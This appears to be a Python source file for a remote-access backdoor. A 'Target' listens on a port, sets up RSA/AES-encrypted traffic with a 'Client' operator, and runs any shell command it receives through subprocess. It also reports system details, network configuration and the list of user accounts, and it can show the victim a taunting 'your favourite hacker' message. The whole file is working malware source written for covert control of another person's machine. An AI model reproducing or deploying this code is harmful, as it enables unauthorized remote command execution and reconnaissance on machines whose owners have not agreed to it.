import socket
import os
import subprocess
import platform
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP


# Machine is the parent class for target and client
class Machine:
    def __init__(self):
        self.buffer = 4096
        self.key_aes = None
        self.iv_aes = None
        # create socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    # Receive encrypted message in AES
    def recv_message_encryption_aes(self, connection):
        mode_aes = AES.MODE_CFB
        text_enc = connection.recv(self.buffer)
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Execute the cipher algorithm
        text = cipher_aes.decrypt(text_enc)
        try:
            return text.decode("utf-8")
        except UnicodeDecodeError:
            return text

    # Send message in AES
    def send_message_encryption_aes(self, connection, text_to_encrypt):
        if type(text_to_encrypt) == str:
            text_to_encrypt = text_to_encrypt.encode("utf-8")
        mode_aes = AES.MODE_CFB
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Execute the cipher algorithm
        text_enc = cipher_aes.encrypt(text_to_encrypt)
        connection.send(text_enc)

    # Close the connection
    def quit(self):
        self.s.close()


# client is "us"
class Client(Machine):
    def __init__(self, host, port=9999):
        super().__init__()
        self.host = host  # Default: 127.0.0.1
        self.port = port
        self.connection_active = False  # use to exit the menu loop
        self.key_rsa = None

    # try to connect to the server
    def connect_to_server(self):
        try:
            self.s.connect((self.host, self.port))
            self.connection_active = True
            print("Connexion has been establish | IP " + self.host + " | Port : " + str(self.port))
        except socket.gaierror as msg:
            print("the ip address is invalid")
            print("Error " + str(msg))

    # Generate a RSA key and send it to the server
    def key_generate_rsa(self):
        self.key_rsa = RSA.generate(self.buffer)
        key_pub = self.key_rsa.publickey()
        key_pub_b = key_pub.export_key()
        self.s.send(key_pub_b)

    # Receive the AES key that the server generate
    def recv_key_aes(self):
        key_aes_enc = self.s.recv(self.buffer)
        iv_aes_enc = self.s.recv(self.buffer)
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)  # Prepare the cipher algorithm
        self.key_aes = cipher_rsa.decrypt(key_aes_enc)
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)
        self.iv_aes = cipher_rsa.decrypt(iv_aes_enc)

    # Send commands to the reverse shell
    def reverse_shell_send_command(self):
        try:
            super().send_message_encryption_aes(self.s, "shell")
            print("Welcome into the Shell Monitor: \nTo quit the shell write \"quit\"\n")
            print("NB: You don't have admin privileges")
            print("-->", end=" ")
            cmd = ""
            while cmd != "quit":
                cmd = input("")
                if len(str.encode(cmd)) > 0:
                    super().send_message_encryption_aes(self.s, cmd)
                    if self.buffer < 8192:
                        self.buffer = int(self.buffer * 2)
                        client_response = super().recv_message_encryption_aes(self.s)
                        self.buffer = int(self.buffer / 2)
                    else:
                        client_response = super().recv_message_encryption_aes(self.s)
                    print(client_response, end="")
        except ConnectionResetError:
            self.quit()
        except OSError:
            print("The connection should be already closed")

    # Send & receive information about the target
    def getinfo(self, info):
        try:
            super().send_message_encryption_aes(self.s, info)
            info = super().recv_message_encryption_aes(self.s)
            print(info)
            info = super().recv_message_encryption_aes(self.s)
            print(info)
            input("\n\nPress ENTER")
        except ConnectionResetError:
            self.quit()

    # decide if the target's programme show something
    def print_target(self, print_bool):
        if print_bool:
            super().send_message_encryption_aes(self.s, "print_target_True")
        else:
            super().send_message_encryption_aes(self.s, "print_target_False")

    # change the buffer size for the client and the target
    def set_target_buffer(self, size):
        try:
            super().send_message_encryption_aes(self.s, "buffer_size")
            super().send_message_encryption_aes(self.s, str(size))
            print("Buffer size: " + str(self.buffer))
        except ConnectionResetError:
            self.quit()

    def quit(self):
        self.connection_active = False
        try:
            super().send_message_encryption_aes(self.s, "quit")
            response_target = super().recv_message_encryption_aes(self.s)
            print(response_target)
        except ConnectionResetError:
            print("We notice that the connection is already closed..")
        except OSError:
            print("Closed")
        super().quit()


# Target is the server
class Target(Machine):

    # initialize host and port server
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host
        self.port = port
        self.conn = None
        self.information = []
        self.print = False
        self.key_pub_usable = None

    # bind de socket with the port
    def socket_bind(self):
        if self.print:
            print("Binding socket to port " + str(self.port))
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            if self.print:
                print("Socket binding error: " + str(msg))

    # accept the new co
    def socket_accept(self):
        self.conn, self.information = self.s.accept()
        if self.print:
            print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " +
                  str(self.information[1]))

    # Receive the RSA key that client generate
    def recv_key_rsa(self):
        key_pub_from_us = self.conn.recv(self.buffer)
        self.key_pub_usable = RSA.import_key(key_pub_from_us)
        if self.print:
            print("RSA key received")

    # generate an AES key and send it to client
    def send_key_aes(self):
        self.key_aes = get_random_bytes(16)
        self.iv_aes = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(self.key_pub_usable)  # Prepare the cipher algorithm
        key_aes_enc = cipher_rsa.encrypt(self.key_aes)  # Execute the cipher algorithm
        cipher_rsa = PKCS1_OAEP.new(self.key_pub_usable)
        iv_aes_enc = cipher_rsa.encrypt(self.iv_aes)
        self.conn.send(key_aes_enc)  # send the AES keys encrypted
        self.conn.send(iv_aes_enc)

    # loop that wait for instruction from client
    def what_to_do(self):
        try:
            instruction = ""
            while instruction != "quit":
                instruction = super().recv_message_encryption_aes(self.conn)
                if instruction == "print_target_True":
                    if not self.print:
                        print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                    self.print = True
                elif instruction == "print_target_False":
                    self.print = False
                elif instruction == "shell":
                    self.reverse_shell_target()
                elif instruction == "getinfo_generality":
                    self.getinfo_target_generality()
                elif instruction == "ipconfig" or instruction == "net user":
                    self.getinfo_target_cmd(instruction)
                elif instruction == "buffer_size":
                    self.change_buffer_size()
        except ConnectionResetError as msg:
            if self.print:
                print("Error : " + str(msg))
            self.quit()

    def reverse_shell_target(self):
        data = super().recv_message_encryption_aes(self.conn)
        while data != "quit":
            try:
                if data[:2] == 'cd':
                    os.chdir(data[3:])
                if len(data) > 0:
                    cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors='replace')
                    super().send_message_encryption_aes(self.conn, output_str + str(os.getcwd()) + "> ")
                    if self.print:
                        print(output_str)
            except OSError as msg:
                error_msg = "Error OS : " + str(msg)
                if self.print:
                    print(error_msg)
                super().send_message_encryption_aes(self.conn, error_msg)
            data = super().recv_message_encryption_aes(self.conn)
        if self.print:
            print("Leaving Shell")
        super().send_message_encryption_aes(self.conn, "we are leaving the Shell prompt on target\n")

    # Get information from the target
    def getinfo_target_generality(self):
        super().send_message_encryption_aes(self.conn, "INFORMATION'S TARGET: \n")
        super().send_message_encryption_aes(self.conn, "System: " + platform.uname()[0] + "\nUser (node): "
                                            + platform.uname()[1] + "\nRelease: " + platform.uname()[2] + "\nVersion: "
                                            + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                                            + "\nProcessor: " + platform.uname()[5])
        if self.print:
            print("YOUR INFORMATION \n")
            print("System: " + platform.uname()[0] + "\nUser (node): " + platform.uname()[1] + "\nRelease: "
                  + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                  + "\nProcessor: " + platform.uname()[5])

    # usr reverse shell to send back information (ip & user list)
    def getinfo_target_cmd(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='replace')
        super().send_message_encryption_aes(self.conn, command)
        super().send_message_encryption_aes(self.conn, output_str)
        if self.print:
            print(command)
            print(output_str)

    # define the buffer size
    def change_buffer_size(self):
        self.buffer = int(self.recv_message_encryption_aes(self.conn))
        if self.print:
            print("the buffer size is", self.buffer)

    # close de connection and the socket
    def quit(self):
        try:
            super().send_message_encryption_aes(self.conn, "The connection is closing. Say bye to \n\tIP: "
                                                + self.information[0] + "\n\tPort " + str(self.information[1]))
            self.conn.close()
            super().quit()
        except socket.error as msg:
            if self.print:
                print("the socket fail to close : " + str(msg))
        except ConnectionResetError:
            if self.print:
                print("The connection has already been stopped")
            super().quit()


